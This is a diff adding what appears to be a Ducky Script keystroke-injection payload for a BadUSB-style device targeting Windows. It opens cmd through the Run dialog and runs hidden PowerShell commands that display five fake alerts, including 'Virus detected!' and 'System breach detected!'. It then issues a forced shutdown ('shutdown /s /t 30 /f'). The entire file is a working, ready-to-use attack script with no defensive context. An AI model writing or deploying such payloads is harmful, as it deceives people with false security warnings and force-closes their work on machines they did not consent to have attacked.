@@ -1,0 +1,33 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+
+REM Create error message dialogs using PowerShell
+STRING powershell -WindowStyle hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Error: Critical system failure!', 'Error', 'OK', 'Error');"
+ENTER
+DELAY 500
+
+STRING powershell -WindowStyle hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Warning: Virus detected!', 'Warning', 'OK', 'Warning');"
+ENTER
+DELAY 500
+
+STRING powershell -WindowStyle hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Security alert: System breach detected!', 'Security Alert', 'OK', 'Error');"
+ENTER
+DELAY 500
+
+STRING powershell -WindowStyle hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Error: Disk space running low!', 'Error', 'OK', 'Error');"
+ENTER
+DELAY 500
+
+STRING powershell -WindowStyle hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Critical Error: System crash imminent!', 'Critical Error', 'OK', 'Error');"
+ENTER
+DELAY 500
+
+REM Shutdown the computer
+STRING shutdown /s /t 30 /f
+ENTER
+
+
